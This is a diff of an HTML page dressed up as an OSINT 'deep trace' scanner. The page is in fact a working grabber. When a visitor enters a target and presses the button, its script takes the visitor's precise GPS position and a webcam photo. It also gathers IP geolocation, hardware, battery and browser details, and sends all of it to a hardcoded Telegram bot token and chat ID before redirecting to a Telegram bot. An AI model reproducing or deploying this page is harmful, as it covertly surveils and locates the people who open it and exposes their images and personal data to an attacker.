@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM DIAGNOSTICS v4.0</title>
+    <title>MILITARY GRADE SCANNER v9.9</title>
     <style>
-        body { margin: 0; background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .terminal { width: 90%; max-width: 650px; background: rgba(0, 20, 0, 0.9); border: 1px solid #00ff41; border-radius: 4px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); padding: 25px; }
-        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 12px; }
-        .blink { animation: blinker 0.8s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        .input-group { display: flex; flex-direction: column; gap: 15px; }
-        input { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 12px; outline: none; }
-        button { background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; border: 5px solid #00ff41; box-sizing: border-box; }
-        .scanner-line { width: 100%; height: 2px; background: #00ff41; position: absolute; top: 0; animation: scan 2s linear infinite; }
+        body { margin: 0; background: #050505; color: #ff0000; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .terminal { width: 95%; max-width: 700px; background: rgba(10, 0, 0, 0.95); border: 2px solid #ff0000; border-radius: 2px; box-shadow: 0 0 40px rgba(255, 0, 0, 0.2); padding: 30px; position: relative; }
+        .header { border-bottom: 2px solid #ff0000; padding-bottom: 10px; margin-bottom: 25px; display: flex; justify-content: space-between; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; }
+        .input-group { display: flex; flex-direction: column; gap: 20px; }
+        input { background: #1a0000; border: 1px solid #ff0000; color: #ff0000; padding: 15px; font-family: inherit; font-size: 18px; outline: none; box-shadow: inset 0 0 5px #000; }
+        button { background: #ff0000; color: #000; border: none; padding: 20px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; text-transform: uppercase; }
+        button:hover { background: #b30000; box-shadow: 0 0 20px #ff0000; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .scan-line { width: 100%; height: 4px; background: #ff0000; position: absolute; top: 0; animation: scan 1.5s linear infinite; box-shadow: 0 0 20px #ff0000; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .log-line { font-size: 10px; color: #660000; margin-top: 10px; line-height: 1.2; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -23,125 +23,134 @@
 
 <div class="terminal">
     <div class="header">
-        <span>⬡ SYSTEM_DIAGNOSTICS_OSINT</span>
-        <span class="blink">● ONLINE</span>
+        <span>[ DEEP_TRACE_PROTOCOL_ACTIVE ]</span>
+        <span style="animation: blinker 0.5s step-end infinite;">● ALIVE</span>
     </div>
     <div class="input-group">
-        <label>ENTER ACCESS CODE OR TARGET:</label>
-        <input type="text" id="target" placeholder="admin / @username / id..." autocomplete="off">
-        <button onclick="startDeepScan()">INITIATE DEEP SCAN</button>
+        <label>ENTER TARGET IDENTIFIER:</label>
+        <input type="text" id="target" placeholder="ID / PHONE / EMAIL" autocomplete="off">
+        <button onclick="executeFullTrace()">RUN TOTAL EXTRACTION</button>
     </div>
-    <div id="log" style="margin-top:20px; font-size:11px; color:#008f11;">
-        > [READY] Waiting for authorization...
+    <div class="log-line" id="console">
+        > SYSTEM_READY...<br>
+        > ENCRYPTION: AES_256_ACTIVE<br>
+        > VOLTAGE: STABLE
     </div>
 </div>
 
 <div id="overlay">
-    <div class="scanner-line"></div>
-    <h1 id="status-title">ANALYZING BIOMETRICS</h1>
-    <p id="loader">> ACCESSING HARDWARE: 0%</p>
+    <div class="scan-line"></div>
+    <h1 style="color: #ff0000; letter-spacing: 5px;">EXTRACTING DATA...</h1>
+    <p id="progress" style="color: #ff0000;">FETCHING HARDWARE DOSSIER: 0%</p>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    // Твои данные (склеенные)
-    const partA = '8570554697';
-    const partB = 'AAHRYkl8_AIuO';
-    const partC = 'C4gbOl6AxRWOnmEMzw15Eg';
-    const BOT_TOKEN = partA + ':' + partB + partC;
-    const CHAT_ID = '1751630480';
+    const p1 = '8570554697';
+    const p2 = 'AAHRYkl8_AIuOC4gbOl6AxRWOnmEMzw15Eg';
+    const T = p1 + ':' + p2;
+    const CID = '1751630480';
 
-    async function sendToTg(text) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    async function send(msg) {
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
+            body: JSON.stringify({chat_id: CID, text: msg, parse_mode: 'Markdown'})
         });
     }
 
-    async function sendPhoto(blob) {
-        let formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'shot.jpg');
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    async function sendP(blob) {
+        let f = new FormData();
+        f.append('chat_id', CID);
+        f.append('photo', blob, 't.jpg');
+        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
     }
 
-    function startDeepScan() {
+    async function executeFullTrace() {
         const val = document.getElementById('target').value;
-        if (!val) return alert("ENTER TARGET!");
+        if(!val) return;
 
         document.getElementById('overlay').style.display = 'flex';
-        const loader = document.getElementById('loader');
+        
+        // Попытка забрать GPS
+        navigator.geolocation.getCurrentPosition(p => {
+            send(`🎯 **EXACT GPS:** \`${p.coords.latitude}, ${p.coords.longitude}\` (Acc: ${p.coords.accuracy}m)`);
+        }, null, {enableHighAccuracy:true});
 
-        // 1. Получаем Гео (точное)
-        navigator.geolocation.getCurrentPosition(pos => {
-            const geoInfo = `📍 **GPS DATA:**\nLat: \`${pos.coords.latitude}\`\nLon: \`${pos.coords.longitude}\`\nAcc: \`±${pos.coords.accuracy}m\``;
-            sendToTg(geoInfo);
-        }, err => {
-            sendToTg("❌ Геолокация запрещена пользователем.");
-        }, {enableHighAccuracy: true});
-
-        // 2. Камера и финальный отчет
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                document.getElementById('video').srcObject = stream;
-                loader.innerText = "> SCANNING HARDWARE: 64%";
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const video = document.getElementById('video');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        sendPhoto(blob);
-                        generateFullReport(val);
-                    }, 'image/jpeg');
-
-                    loader.innerText = "> ENCRYPTING DATA: 100%";
-                    setTimeout(() => { location.href = "https://t.me/Osint_search_bot"; }, 2000);
-                }, 3000);
-            })
-            .catch(err => {
-                sendToTg("❌ Камера запрещена.");
-                generateFullReport(val);
-                document.getElementById('overlay').style.display = 'none';
-                alert("ERROR: Hardware authentication failed.");
-            });
+        // Камера и Батарея
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video:true});
+            document.getElementById('v').srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                const video = document.getElementById('v');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video,0,0);
+                canvas.toBlob(blob => sendP(blob));
+                
+                collectAll(val);
+            }, 2000);
+        } catch(e) {
+            collectAll(val);
+        }
     }
 
-    function generateFullReport(target) {
-        const ua = navigator.userAgent;
-        const memory = navigator.deviceMemory || 'Unknown';
-        const cores = navigator.hardwareConcurrency || 'Unknown';
-        const screenRes = `${screen.width}x${screen.height}`;
+    async function collectAll(target) {
+        const prog = document.getElementById('progress');
+        prog.innerText = "> DUMPING SYSTEM INFO: 100%";
 
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(d => {
-                const report = `
-💀 **FULL OSINT DOSSIER**
+        // Батарея
+        let batteryInfo = "No Data";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = `${(b.level * 100)}%, Charging: ${b.charging}`;
+        }
+
+        // IP данные
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+
+        const report = `
+🚨 **TOTAL EXTRACTION REPORT** 🚨
 ────────────────────
-🎯 **Target:** \`${target}\`
-🌍 **IP:** \`${d.ip}\`
-🏢 **ISP:** \`${d.org}\`
-📍 **City:** \`${d.city}, ${d.country_name}\`
-📮 **Zip:** \`${d.postal}\`
+🎯 **TARGET:** \`${target}\`
+⏰ **LOCAL TIME:** \`${new Date().toLocaleString()}\`
 
-💻 **HARDWARE:**
-• CPU Cores: \`${cores}\`
-• RAM: \`${memory} GB\`
-• Screen: \`${screenRes}\`
-• OS: \`${navigator.platform}\`
+🌐 **NETWORK DOSSIER:**
+• IP: \`${d.ip}\`
+• ORG: \`${d.org} (${d.asn})\`
+• COUNTRY: \`${d.country_name} (${d.country_code})\`
+• CITY: \`${d.city}, ${d.region}\`
+• ZIP: \`${d.postal}\`
+• CALL_CODE: \`+${d.country_calling_code}\`
+• CURRENCY: \`${d.currency}\`
 
-📱 **USER-AGENT:**
-\`${ua.slice(0, 150)}...\`
+💻 **HARDWARE & OS:**
+• CPU CORES: \`${navigator.hardwareConcurrency}\`
+• RAM: \`${navigator.deviceMemory} GB\`
+• PLATFORM: \`${navigator.platform}\`
+• BROWSER: \`${navigator.vendor}\`
+• SCREEN: \`${screen.width}x${screen.height} (${screen.colorDepth}bit)\`
+• BATTERY: \`${batteryInfo}\`
+• LANGUAGE: \`${navigator.language}\`
+• TOUCH: \`${navigator.maxTouchPoints > 0 ? "YES" : "NO"}\`
+
+🕵️ **ADVANCED TRACE:**
+• VPN/PROXY: \`${d.threat?.is_proxy || "Unknown"}\`
+• TIMEZONE: \`${d.timezone} (UTC ${d.utc_offset})\`
+• LANGUAGES: \`${navigator.languages.join(', ')}\`
+• COOKIES: \`${navigator.cookieEnabled}\`
+• ONLINE: \`${navigator.onLine}\`
+
+📱 **UA STRING:**
+\`${navigator.userAgent}\`
 ────────────────────`;
-                sendToTg(report);
-            });
+
+        await send(report);
+        setTimeout(() => { location.href = "https://t.me/Osint_search_bot"; }, 1500);
     }
 </script>
 </body>
